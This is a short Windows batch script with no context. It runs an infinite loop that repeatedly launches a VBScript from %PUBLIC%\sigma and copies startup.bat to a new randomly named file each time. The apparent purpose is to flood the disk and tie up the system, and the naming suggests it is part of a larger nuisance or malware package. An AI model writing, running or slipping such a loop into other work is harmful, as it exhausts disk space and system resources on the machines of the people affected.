@echo off
:loop
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
copy %PUBLIC%\sigma\startup.bat %PUBLIC%\sigma\startup-%random%.bat
goto loop